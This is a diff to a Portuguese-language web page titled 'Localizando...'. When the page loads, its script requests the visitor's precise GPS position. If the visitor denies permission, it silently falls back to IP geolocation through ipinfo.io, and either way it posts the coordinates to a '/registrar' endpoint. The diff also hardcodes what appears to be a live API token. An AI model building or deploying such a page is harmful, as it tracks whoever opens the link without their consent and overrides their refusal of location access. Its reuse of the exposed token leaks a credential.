@@ -5,6 +5,11 @@
     <title>Localizando...</title>
     <script>
         function enviarLocalizacao(lat, lon, precisa) {
+            if (!lat || !lon || lat === 0.0 || lon === 0.0) {
+                console.warn("Localização inválida, não será enviada.");
+                return;
+            }
+
             fetch('/registrar', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -14,35 +19,31 @@
             });
         }
 
-        function obterLocalizacao() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        // Se o usuário permitir, usamos as coordenadas GPS
-                        enviarLocalizacao(pos.coords.latitude, pos.coords.longitude, true);
-                    },
-                    erro => {
-                        // Se o usuário não permitir, tentamos buscar via IP
-                        fetch('https://ipinfo.io/json?token=SEU_TOKEN_IPINFO')  // Substitua pelo seu token real
-                            .then(res => res.json())
-                            .then(d => {
-                                const [lat, lon] = d.loc.split(',');
-                                enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
-                            })
-                            .catch(() => {
-                                // Caso não consiga pegar a localização, enviaremos (0,0) como fallback
-                                enviarLocalizacao(0.0, 0.0, false);
-                            });
-                    },
-                    { timeout: 5000 } // Tempo de timeout para pegar a localização
-                );
-            } else {
-                // Caso o navegador não suporte geolocalização
-                enviarLocalizacao(0.0, 0.0, false);
-            }
+        function tentarLocalizacaoPorIP() {
+            fetch('https://ipinfo.io/json?token=848013f8df8279')  // Substitua por seu token real
+                .then(res => res.json())
+                .then(d => {
+                    if (!d.loc) throw new Error("Sem campo loc no IPInfo");
+                    const [lat, lon] = d.loc.split(',');
+                    enviarLocalizacao(parseFloat(lat), parseFloat(lon), false);
+                })
+                .catch(err => {
+                    console.error("Erro ao buscar localização por IP:", err);
+                    enviarLocalizacao(0.0, 0.0, false);
+                });
         }
 
-        window.onload = obterLocalizacao; // Inicia a coleta da localização assim que a página carregar
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                const { latitude, longitude } = pos.coords;
+                enviarLocalizacao(latitude, longitude, true);
+            },
+            err => {
+                console.warn("GPS negado ou falhou:", err);
+                tentarLocalizacaoPorIP();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
     </script>
 </head>
 <body>
